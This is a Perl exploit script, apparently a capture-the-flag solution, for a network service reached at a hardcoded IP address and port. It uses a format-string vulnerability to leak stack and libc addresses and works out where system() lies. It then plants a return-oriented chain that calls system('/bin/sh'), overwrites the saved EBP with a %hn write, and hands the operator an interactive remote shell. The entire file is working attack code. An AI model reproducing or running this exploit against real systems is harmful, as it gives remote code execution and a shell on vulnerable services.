#!/usr/bin/perl


use strict;
use warnings;
use Time::HiRes qw(usleep);
use IO::Socket::INET;
use IO::Select;

use constant {
    HOST => '54.165.223.128',
    #HOST => '127.0.0.1',
    PORT => 2555,
    PUTS_OFF1 => 0x17ec0-0xb,
    PUTS_OFF => 0x64c10,
    SYSTEM_OFF => 0x3fcd0,
    PAYLOAD_OFF => 0x24d0,
    SH_OFF => 0x15da89
};

# Connect to the server...
my $sock = IO::Socket::INET->new(
    PeerAddr => HOST,
    PeerPort => PORT,
    Proto    => 'tcp') || die $@;



# Create new user...
send_cmd("1\n");            # Create user
send_cmd("user\n");         # Username
send_cmd("1111111111\n");   # phone
send_cmd("500\n");          # description len
send_cmd("A"x8 . "\n");     # description


# Leak stack and libc address...
my $stack = leak_off(6);
my $puts  = leak_off(2) + PUTS_OFF1;
my $libc = $puts - PUTS_OFF;
my $system = $libc + SYSTEM_OFF;
my $payload_addr = $stack - PAYLOAD_OFF;


printf "[+] Stack: %#x\n", $stack;
printf "[+] Libc: %#x\n", $libc;
printf "[+] puts: %#x\n", $puts;
printf "[+] system: %#x\n", $system;



# Create new user, to fill the stack
# with our ropchain
send_cmd("1\n");
send_cmd("AAAA\n");
send_cmd("1111111111\n");
send_cmd("500\n");
send_cmd(build_rop_chain() . "\n");

# Rewrite the 2 least significant bytes of saved-ebp...
rewrite_ebp(($payload_addr) & 0xFFFF);

# Quit.
send_cmd("5\n");

while(<$sock>) {
    last if m/are now erased/;
}

print "[+] Enjoy your shell !\n";
shell();

sub build_rop_chain {
    my $rop;

    # @ret -> 'rop sled'
    $rop .= pack("L", 0x080484b6)x(70);

    # Call system(@sh)
    $rop .= pack("L", $system);
    $rop .= pack("L", $libc + SH_OFF)x2;

    $rop .= "D"x(450 - length($rop));

    return $rop;

}

sub leak_off {
    my $off = shift;

    send_cmd("3\n");        # modify user
    send_cmd("user\n");     # username
    send_cmd("2\n");        # modify description
    send_cmd("1000\n");     # size of description
    send_cmd("%$off\$x\n"); # format string
    send_cmd("4\n");        # display()

    while(<$sock>) {

        if(m/Description: (.+)/) {
            return hex("0x" . $1);
        }
    }
}


sub rewrite_ebp {
    my $val = shift;

    # format string (rewrite the 2 least significant bytes
    # of 6th argument on the stack (saved ebp)
    my $format =
        "%6\$" . ($val) . "x" .
        "%6\$hn";

    send_cmd("3\n");        # modify user
    send_cmd("user\n");     # username
    send_cmd("2\n");        # modify description
    send_cmd("1000\n");     # description length
    send_cmd("$format\n");  # format string
    send_cmd("4\n");        # display()

    while(<$sock>) {
        if(m/Description: (.+)/) {
            return;
        }
    }
}

sub send_cmd {
    my $cmd = shift;

    print $sock $cmd;

    usleep(1000*10);
}


sub shell {
    my $s = IO::Select->new();
    my @ready;
    my $buf;

    local $| = 1;

    $s->add(\*STDIN);
    $s->add($sock);

    print "\$ ";

    while(1) {
        @ready = $s->can_read(0.10);
        foreach(@ready) {
            if($sock == $_) {
                $sock->recv($buf, 1024);
                exit if(length($buf) == 0);

                print $buf;
                print "\$ ";
            } elsif(\*STDIN == $_) {
                $buf = <STDIN>;
                exit if(!$buf);
                print $sock $buf;
            }
        }
    }
}
